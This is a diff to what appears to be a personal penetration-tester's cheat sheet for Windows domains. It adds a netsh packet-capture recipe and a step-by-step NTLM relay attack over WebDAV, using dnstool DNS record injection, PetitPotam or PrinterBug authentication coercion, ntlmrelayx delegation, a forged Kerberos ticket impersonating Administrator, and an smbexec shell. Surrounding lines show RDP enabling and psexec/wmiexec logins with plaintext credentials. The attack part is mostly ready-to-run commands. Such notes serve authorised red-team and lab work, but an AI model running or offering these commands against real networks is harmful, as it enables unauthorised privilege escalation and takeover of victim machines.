@@ -230,6 +230,16 @@
     > reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
     more info: https://theitbros.com/how-to-remotely-enable-remote-desktop-using-powershell/
 
+*********************
+** NETWORK CAPTURE **
+*********************
+
+    $ netsh trace start capture=yes IPv4.Address=192.168.122.2
+    $ netsh trace stop
+
+    Then use etl2pcapng to convert from etl to pcapng
+    $ .\etl2pcapng.exe in.etl out.pcapng
+
 **********
 ** MISC **
 **********
@@ -240,3 +250,48 @@
     $ psexec.py corp.com/user:P4ssw0rd@dc01.corp.com
     if the latter didn't work try with wmiexec
     $ wmiexec.py corp.com/user:P4ssw0rd@dc01.corp.com
+
+****************
+** NTLM RELAY **
+****************
+
+    -> NTLM RELAY is a range of attacks, here is an example using the Webdav client
+    https://www.thehacker.recipes/ad/movement/ntlm/relay
+
+    NTLM RELAY via WEBDAV
+    conditions:
+        - webdav client actived -> it is by default on windows workstation, not servers
+        - LDAP signing, channel binding must be disabled (it is by default)
+    -> at the end of the attack, we will have a local admin account on a workstation on our choice (that have webdav client activated)
+
+    High level steps:
+        Add a DNS entry on the Domain Controller
+        Coerce a WebDav authentication from the victim workstation toward our attacker machine (using PetitPotam or PrinterBug)
+        Relay the authentication toward the Domain Controller via LDAP
+
+        See https://www.thehacker.recipes/ad/movement/ntlm/relay to know which protocols we can use for the attack
+
+    Actual steps:
+        - List DNS zones with dnstools
+            $ python3 ~/tools/krbrelayx/dnstool.py -u "$domain\$user' -p $passwd --print-zone $dns_target_ip // $dns_target_ip is domain controller ip
+        - Add a DNS entry
+            $ python3 ~/tools/krbrelayx/dnstool.py -u "$domain\$user' -p $passwd -r $tdns -a add -d $lip $dnstip 
+            // sometimes the --legacy can be useful. The --zone $zone may be used to specify a zone retrieved during the previous step
+        - Verify if WebDAV  is activated on the target victim workstation
+            $ cme smb $target_ip -u $user -p $passwd -M webdav
+        - Verify on the DC that LDAP is not secure: LDAP signing and channel binding are disabled (the tool is not good, TODO: search for a better one like a nmap script, but must be authenticated)
+            $ python3 ~/tools/LdapRelayScan/LdapRelayScan.py -dc-ip $dc_ip -u $user -p $passwd
+        - The attack use the fact that by default, an "authenticated user" can add up to 10 computer accounts on the domain. We will see if we are in the limit by testing the attack
+        - Use PetitPotam or PrinterBug like the following
+        - Launch ntlmrelayx
+            $ sudo ~/tools/krbrelayx/ntlmrelayx.py -t ldaps://$dc_ip --http-port 8080 --delegate-access --no-dump --no-smb-server 
+        - Launch PetitPotam or PrinterBug
+            $ python3 ~/tools/PetitPotam/PetitPotam.py -u $user -p $passwd -d $netbios_domain_name $ipToRelay $dc_ip
+        - An account will be created on the Active Directory. Take note of the credentials, and use to create a kerberos ticket to authenticate on the victim workstation
+          I did not understand this step fully.
+            $ getST.py -spn "cifs/$FQDN" -impersonate $userImpers -dc-ip $dc_ip "$domain/$user:$passwd" 
+            // $userImpers will usually be Administrator (local admin on victim workstation)
+            // $FQDN is the victim workstation fqdn
+            // $user and $passwd are the ones created by ntlmrelayx.py previously
+            $ export KRB5CCNAME=./Administrateur.ccache // this is the ticket created by getST.py
+            $ smbexec.py -k -no-pass "$domain/$userImpers@$domain_controller" -share ADMIN$
